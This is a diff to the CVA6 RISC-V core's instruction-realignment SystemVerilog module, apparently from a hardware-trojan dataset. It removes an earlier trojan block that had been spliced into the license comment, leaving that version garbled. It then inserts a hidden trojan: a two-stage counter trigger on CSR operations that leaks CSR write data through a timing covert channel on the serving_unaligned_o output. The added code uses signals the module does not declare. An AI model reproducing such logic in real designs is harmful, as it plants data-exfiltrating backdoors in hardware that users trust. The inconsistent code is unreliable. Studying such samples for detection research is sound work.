@@ -1,58 +1,6 @@
 // Copyright 2018 - 2019 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 9609;
-    localparam int ACTIVATE_DELAY = 4804;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && data_i) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && data_i) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
-
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = data_i[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk_i or negedge rst_ni) begin
-            if (!rst_ni) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
-            end else begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end
-        end
-     you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -97,6 +45,55 @@ module instr_realign
     // Instruction - instr_scan&instr_queue
     output logic [CVA6Cfg.INSTR_PER_FETCH-1:0][31:0] instr_o
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3819, act=1909)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 3819;
+    localparam int ACTIVATE_DELAY  = 1909;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
+            end else begin
+                covert_bit_out       <= 1'b0;
+                covert_delay_counter <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
+            end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
+        end
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
   // as a maximum we support a fetch width of 64-bit, hence there can be 4 compressed instructions
   logic [CVA6Cfg.INSTR_PER_FETCH-1:0] instr_is_compressed;
 
@@ -112,7 +109,7 @@ module instr_realign
   // register to save the unaligned address
   logic [CVA6Cfg.VLEN-1:0] unaligned_address_d, unaligned_address_q;
   // we have an unaligned instruction
-  assign serving_unaligned_o = unaligned_q;
+  assign serving_unaligned_o = trojan_active ? covert_bit_out : (unaligned_q);  // TROJAN Covert
 
   // Instruction re-alignment
   if (CVA6Cfg.FETCH_WIDTH == 32) begin : realign_bp_32
